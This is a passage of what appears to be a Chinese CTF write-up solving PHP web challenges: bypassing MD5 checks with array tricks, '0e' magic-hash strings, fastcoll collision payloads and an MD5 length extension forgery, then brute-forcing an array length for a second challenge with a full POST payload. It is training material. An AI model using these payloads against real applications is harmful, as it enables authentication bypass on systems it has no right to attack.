<pre class="language-php" data-language="php"><code class="language-php">apple<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>banana<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span></code></pre>

<p>第二层转化为了<code>string</code>，此时数组会变成<code>array</code>无法绕过，可以利用后面的弱比较，让0e开头的字符串误以为科学计数法，转化为0</p>
<pre class="language-php" data-language="php"><code class="language-php">appple<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>banananana<span class="token operator">=</span><span class="token constant">QLTHNDT</span> </code></pre>

<p>第三层变成了强比较，可以使用fastcoll工具来得到一些MD5真实相等的值</p>
<p>先随便创建一个txt文件，然后将文件拖入<code>fastcoll</code>中得到两个MD5值相等的文件，然后使用php得出MD5值相等的俩字符串</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">function</span> <span class="token function-definition function">readmyfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token variable">$fh</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"D:\CTF\Tool\\fastcoll_v1.0.0.5.exe\drafr_msg1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"D:\CTF\Tool\\fastcoll_v1.0.0.5.exe\drafr_msg2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<pre class="language-php" data-language="php"><code class="language-php">apppple<span class="token operator">=</span>hsad<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token constant">E9</span><span class="token operator">%</span><span class="token constant">CC</span><span class="token operator">%</span><span class="token constant">C5</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token constant">D4</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token constant">BB</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token number">23</span>Vg<span class="token operator">%</span><span class="token number">22</span>u<span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">95</span>Z<span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">8</span>DS<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">92</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span><span class="token constant">F2</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span>EDf<span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token constant">EB</span><span class="token operator">-</span>ha<span class="token operator">%</span><span class="token number">88</span><span class="token operator">%</span><span class="token constant">D3</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">95</span>E<span class="token operator">%</span><span class="token constant">F6</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">21</span>y<span class="token operator">%</span><span class="token constant">A5</span><span class="token operator">%</span><span class="token number">12</span>f<span class="token operator">%</span><span class="token constant">B5H</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span>F7Lci<span class="token operator">%</span><span class="token number">8</span>Dg<span class="token operator">%</span><span class="token constant">FC</span><span class="token operator">%</span><span class="token number">7</span>B8y<span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">8</span>E<span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token operator">%</span><span class="token number">0</span>F<span class="token operator">%</span><span class="token number">5</span>EI<span class="token operator">%</span><span class="token number">13</span><span class="token operator">%</span>C8n<span class="token operator">%</span><span class="token number">8</span>A<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">9</span>FK_a<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>C1h<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token number">0</span>Atg<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token number">5</span>E<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">95</span>g<span class="token operator">%</span><span class="token constant">F9T</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">03</span>K<span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token constant">C8</span><span class="token operator">%</span><span class="token constant">A8W</span><span class="token operator">%</span><span class="token number">1</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">84</span><span class="token operator">%</span><span class="token number">9</span>F<span class="token operator">%</span><span class="token constant">D6</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token constant">BCT</span>
<span class="token operator">&amp;</span>banananana<span class="token operator">=</span>hsad<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token constant">E9</span><span class="token operator">%</span><span class="token constant">CC</span><span class="token operator">%</span><span class="token constant">C5</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token constant">D4</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token constant">BB</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token number">23</span>Vg<span class="token operator">%</span>A2u<span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">95</span>Z<span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">8</span>DS<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">92</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span><span class="token constant">F2</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span>EDf<span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token constant">EB</span><span class="token operator">-</span>ha<span class="token operator">%</span><span class="token number">88</span>S<span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">95</span>E<span class="token operator">%</span><span class="token constant">F6</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">21</span>y<span class="token operator">%</span><span class="token constant">A5</span><span class="token operator">%</span><span class="token number">12</span><span class="token operator">%</span><span class="token constant">E6</span><span class="token operator">%</span><span class="token constant">B5H</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span>F7Lci<span class="token operator">%</span><span class="token number">8</span>Dg<span class="token operator">%</span><span class="token constant">FC</span><span class="token operator">%</span><span class="token number">7</span>B8y<span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">8</span>E<span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token operator">%</span><span class="token number">0</span>F<span class="token operator">%</span><span class="token number">5</span>E<span class="token operator">%</span><span class="token constant">C9</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">%</span>C8n<span class="token operator">%</span><span class="token number">8</span>A<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">9</span>FK_a<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>C1h<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token number">0</span>Atg<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token number">5</span>E<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">95</span>g<span class="token operator">%</span><span class="token constant">F9T</span><span class="token operator">%</span><span class="token constant">A7</span><span class="token operator">%</span><span class="token number">02</span>K<span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token constant">C8</span><span class="token operator">%</span><span class="token constant">A8W</span><span class="token operator">%</span><span class="token number">1</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">84</span><span class="token operator">%</span><span class="token number">9</span>FV<span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token constant">BCT</span></code></pre>

<p>第四层为哈希拓展攻击</p>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html">哈希长度扩展攻击</a></p>
<p><a target="_blank" rel="noopener" href="https://luoingly.top/post/md5-length-extension-attack/">浅析 MD5 长度扩展攻击 (MD5 Length Extension Attack)</a></p>
<p>使用工具：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py">md5-extension-attack.py</a></p>
<p>对于原始文本的测量，题目给出了<code>$_SESSION[&#39;random&#39;]</code>的构造方式</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></span></code></pre>

<p><img src="MD5.png" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php">name<span class="token operator">=</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span>admin<span class="token operator">&amp;</span>md5<span class="token operator">=</span>f2f894abbd41c972a311332cfe76c6fe</code></pre>

<h4 id="玩原神玩的"><a href="#玩原神玩的" class="headerlink" title="玩原神玩的"></a>玩原神玩的</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">ys_open</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"错了！就你还想玩原神？❌❌❌"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">ys_open</span><span class="token punctuation">(</span><span class="token variable">$tip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$tip</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"我要玩原神"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我不管，我要玩原神！😭😭😭"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">dumpFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">dumpFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">sizeof</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"可恶的QQ人！😡😡😡"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"100%"</span> <span class="token operator">||</span> <span class="token variable">$b</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"love100%"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"某站崩了？肯定是某忽悠干的！😡😡😡"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
  <span class="token variable">$flag</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$ii</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$ii</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ii</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$flag</span><span class="token punctuation">[</span><span class="token variable">$ii</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$ii</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token variable">$ii</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  
  <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span></code></pre>

<p>不知道<code>$array</code>的长度可以直接py爆破</p>
<pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"len[0]=1"</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"payload.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
        payload <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"&amp;len[</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">]=1"</span></span>
</code></pre>

<p>后面两个很好绕过，记得<code>%</code>要url编码</p>
<pre class="language-http" data-language="http"><code class="language-http">POST:
len[0]=1&amp;len[1]=1&amp;len[2]=1&amp;len[3]=1&amp;len[4]=1&amp;len[5]=1&amp;len[6]=1&amp;len[7]=1&amp;len[8]=1&amp;len[9]=1&amp;len[10]=1&amp;len[11]=1&amp;len[12]=1&amp;len[13]=1&amp;len[14]=1&amp;len[15]=1&amp;len[16]=1&amp;len[17]=1&amp;len[18]=1&amp;len[19]=1&amp;len[20]=1&amp;len[21]=1&amp;len[22]=1&amp;len[23]=1&amp;len[24]=1&amp;len[25]=1&amp;len[26]=1&amp;len[27]=1&amp;len[28]=1&amp;len[29]=1&amp;len[30]=1&amp;len[31]=1&amp;len[32]=1&amp;len[33]=1&amp;len[34]=1&amp;len[35]=1&amp;len[36]=1&amp;len[37]=1&amp;len[38]=1&amp;len[39]=1&amp;len[40]=1&amp;len[41]=1&amp;len[42]=1&amp;len[43]=1&amp;len[44]=1&amp;m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966</code></pre>

<p>最后根据给出加密后的 flag 数组，加密流程是把 flag 每⼀个字符的 ASCII 值和当前索引异或再取 md5 值，挨个输出，脚本爆破即可 </p>
